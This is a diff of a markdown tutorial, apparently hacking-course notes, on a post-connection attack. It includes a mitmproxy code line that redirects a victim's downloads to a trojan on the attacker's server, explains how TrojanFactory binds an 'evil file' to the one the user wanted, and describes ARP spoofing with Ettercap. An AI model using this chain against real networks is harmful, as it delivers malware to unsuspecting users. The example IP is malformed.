@@ -17,6 +17,7 @@ The following documentation is based on a post connection attack. Meaning, after
 ```shell
 touch proxyscript.py
 ```
+
 2. We will write the following code in the proxyscript.py file using any text editor.
 ```python
 import mitmproxy
@@ -116,7 +117,6 @@ def request(flow):
         flow.reponse = mitmproxy.http.HTTPResponse.make(301, "", {"Location":"http://10.15.262.5/file.zip"})
 ```
 Note: I am using subprocess.call to run a bash command, here, I am appending the full path to TrojanFactory since I am trying to access it outside the directory. -f is the front file that will be displayed to the user (in this I am creating a variable, storing the value of the file that the user downloads in that variable, and then I am using that variable for -f). Hence, I have created the variable called front_file and thats going to be equal to the file that the user is downloading. -e is the evil file which is stored in my /var/www/html. -o is the location to store the result, -i is the location of the Trojan icon that is to be used. If you look closely, I am using a hash sign for -f and -e file so that it does not get intercepted in the if condition and the code does not get stuck in a loop.
-
 
 *Testing Script On A Remote Computer To Replace Downloads With a Trojan.*
 1. Now that we know how to create trojans and we have a working script that will replace downloads on the fly with any file that we want, lets test this script against a remote computer. We will start by running an ARP spoofing attack against the client computer using Ettercap. (Note: we can use MTIMproxy whenever we are the man in the middle, hence it can be used with ARP spoofing attack, with Fake AP or rather with any other scenario. For convenience, we will use Ettercap to become the man in the middle.)
